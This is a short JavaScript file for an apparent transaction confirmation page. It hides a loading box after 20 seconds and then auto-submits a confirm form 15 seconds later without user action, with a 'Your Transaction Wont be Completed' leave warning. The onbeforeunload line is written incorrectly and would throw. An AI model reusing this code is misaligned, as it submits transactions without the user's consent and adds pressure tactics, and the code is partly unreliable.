const loadingBox = document.querySelector('.loading-box')
const formBox = document.querySelector('.confirm-box')
const targetInput = document.getElementById('merchant')



// TODO: SETTIMEOUT 20 SECONDS FOR SPINNING LOADINBOX

window.addEventListener('load', () => {
    setTimeout(() => {
        loadingBox.style.display = 'none'
        formBox.style.display = 'flex'
        setTimeout(() => {
            formBox.submit()
        }, 15000)
    }, 20000)
})

window.onbeforeunload((event) => {
    event.returnValue = "Your Transaction Wont be Completed if you leave this page"
})





